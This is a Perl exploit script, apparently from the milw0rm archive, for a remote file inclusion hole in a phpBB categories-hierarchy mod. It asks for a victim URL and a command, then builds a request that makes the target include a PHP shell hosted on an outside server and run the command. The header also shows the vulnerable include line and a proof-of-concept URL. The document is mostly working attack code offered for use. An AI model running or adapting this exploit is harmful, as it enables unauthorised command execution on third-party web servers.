# (C) xoron
#
# [Name: Categories hierarchy v2.1.2 (phpbb_root_path) Remote File Include Exploit]
#
# [Script name: Ptifo mod-CH_212_installed
#
# [Author: xoron]
# [Exploit coded by xoron]
#
# [Download: http://sourceforge.net/project/showfiles.php?group_id=125710]
#
# [xoron.biz - xoron.info]
#
# [Thanx: str0ke, kacper, k1tk4t, SHiKA, can bjorn]
#
# [Tesekkurler: chaos, pang0, DJR]
# 
# [POC: /includes/class_template.php?phpbb_root_path=http://evilscripts?]
#
# [Vuln Codes: include($phpbb_root_path . 'includes/template.' . $phpEx); ]
#
#
$rfi = "class_template.php?phpbb_root_path="; 
$path = "/includes/";
$shell = "http://pang0.by.ru/shall/pang057.zz?cmd=";
print "Language: English // Turkish\nPlz Select Lang:\n"; $dil = <STDIN>; chop($dil);
if($dil eq "English"){
print "(c) xoron\n";
&ex;
}
elsif($dil eq "Turkish"){
print "Kodlayan xoron\n";
&ex;
}
else {print "Plz Select Languge\n"; exit;}
sub ex{
$not = "Victim is Not Vunl.\n" and $not_cmd = "Victim is Vunl but Not doing Exec.\n"
and $vic = "Victim Addres? with start http:// :" and $thx = "Greetz " and $diz = "Dictionary?:" and $komt = "Command?:"
if $dil eq "English";
$not = "Adreste RFI acigi Yok\n" and $not_cmd = "Adresde Acýk Var Fakat Kod Calismiyor\n"
and $vic = "Ornek Adres http:// ile baslayan:" and $diz = "Dizin?: " and $thx = "Tesekkurler " and $komt = "Command?:"
if $dil eq "Turkish";
print "$vic";
$victim = <STDIN>;
chop($victim);
print "$diz";
$dizn = <STDIN>;
chop($dizn);
$dizin = $dizn;
$dizin = "/" if !$dizn;
print "$komt";
$cmd = <STDIN>;
chop($cmd);
$cmmd = $cmd;
$cmmd = "dir" if !$cmd;
$site = $victim;
$site = "http://$victim" if !($victim =~ /http/);
$acacaz = "$site$dizin$rfi$shell$cmmd";
print "(c) xoron.info - xoron.biz\n$thx: pang0, chaos, can bjorn\n";
sleep 3;
system("start $acacaz");
}

# milw0rm.com [2007-02-05]